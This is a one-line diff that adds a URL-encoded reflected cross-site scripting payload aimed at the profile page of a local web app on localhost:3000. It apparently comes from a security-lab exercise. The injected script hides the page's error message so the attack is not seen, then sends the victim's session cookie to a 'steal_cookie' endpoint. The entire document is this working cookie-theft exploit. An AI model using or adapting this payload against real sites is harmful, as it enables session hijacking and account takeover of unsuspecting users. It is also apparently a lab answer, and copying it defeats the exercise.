@@ -1,0 +1,1 @@
+http://localhost:3000/profile?username=%3Cscript%3E%0Adocument.getElementsByClassName('error')%5B0%5D.style.visibility%20%3D%20'hidden'%3B%0Avar%20xhr%20%3D%20new%20XMLHttpRequest()%3B%0Axhr.open(%22GET%22%2C%20%22http%3A%2F%2Flocalhost%3A3000%2Fsteal_cookie%3Fcookie%3D%22%20%2B%20document.cookie.split('%3D')%5B1%5D%2C%20true)%3B%0Axhr.send()%3B%0A%3C%2Fscript%3E
